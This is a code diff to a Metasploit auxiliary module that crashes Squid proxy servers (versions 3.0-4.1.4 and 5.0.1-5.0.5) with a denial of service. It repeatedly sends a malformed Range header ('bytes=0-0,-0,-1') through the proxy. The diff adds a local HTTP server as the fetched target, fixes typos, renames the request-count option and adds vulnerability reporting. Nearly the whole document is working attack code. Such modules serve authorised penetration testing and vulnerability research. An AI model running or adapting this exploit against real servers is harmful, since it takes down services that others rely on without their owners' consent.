@@ -5,6 +5,7 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
@@ -15,8 +16,8 @@ class MetasploitModule < Msf::Auxiliary
         'Description' => %q{
           The range handler in The Squid Caching Proxy Server 3.0-4.1.4 and
           5.0.1-5.0.5 incorrectly handles impossible-to-satisfy range requests, and
-          allows remote attackers to cause a deniel of service (assertion) through
-          a single HTTP request via a specific Range header."
+          allows remote attackers to cause a denial of service (assertion) through
+          a single HTTP request via a specific Range header.
         },
         'Author' => [
           'Joshua Rogers' # Discoverer, and Metasploit Module
@@ -37,33 +38,44 @@ class MetasploitModule < Msf::Auxiliary
           'SideEffects' => [ IOC_IN_LOGS ]
         }
       )
-)
+    )
 
     register_options(
       [
         Opt::RPORT(3128),
-        OptString.new('RequestCount', [ true, 'The number of requests to be sent, as well as the number of re-tries to confirm a dead host', 50 ]),
+        OptInt.new('REQUEST_COUNT', [ true, 'The number of requests to be sent, as well as the number of re-tries to confirm a dead host', 50 ]),
       ]
     )
+  end
+
+  def on_request_uri(cli, _request)
+    # the Cache-Control header must be set to avoid needing a specific configuration setting and the body must not be
+    # empty
+    send_response(cli, '<html></html>', { 'Cache-Control' => 'private' })
   end
 
   def run
     count = 0
     error_count = 0 # The amount of connection errors from the server.
-    reqs = datastore['RequestCount'] # The maximum amount of requests (with a valid response) to the server.
+    reqs = datastore['REQUEST_COUNT'] # The maximum amount of requests (with a valid response) to the server.
 
     print_status("Sending #{reqs} DoS requests to #{peer}")
 
-    while reqs > count
+    start_service
 
-      res = send_request_raw({
-        'uri' => 'http://neverssl.com/',
-        'headers' => {
-          'Host' => 'neverssl.com',
-          'Range' => 'bytes=0-0,-0,-1',
-          'Proxy-Connection' => 'Keep-Alive'
-        }
-      })
+    while reqs > count
+      begin
+        res = send_request_raw({
+          'uri' => get_uri,
+          'headers' => {
+            'Host' => "#{srvhost_addr}:#{srvport}",
+            'Range' => 'bytes=0-0,-0,-1',
+            'Proxy-Connection' => 'Keep-Alive'
+          }
+        })
+      rescue Errno::ECONNRESET
+        res = nil
+      end
 
       if res
         count += 1
@@ -73,9 +85,9 @@ class MetasploitModule < Msf::Auxiliary
         if res.code != 206
           print_error('Unexpected Response. Host may not be valid.')
         end
-      end
 
-      next if res # Host could be completely dead, or just waiting for another Squid child.
+        next # Host could be completely dead, or just waiting for another Squid child.
+      end
 
       if count == 0
         print_error('Cannot connect to host.')
@@ -83,11 +95,16 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       error_count += 1
-      if error_count > reqs # If we cannot connect after `res` amount of attempts, assume the DoS was succesful.
-        print_good('DoS completely succesful.')
-        return
-      end
+      next unless error_count > reqs # If we cannot connect after `res` amount of attempts, assume the DoS was successful.
 
+      print_good('DoS completely successful.')
+      report_vuln(
+        host: rhost,
+        port: rport,
+        name: name,
+        refs: references
+      )
+      return
     end
   end
 end
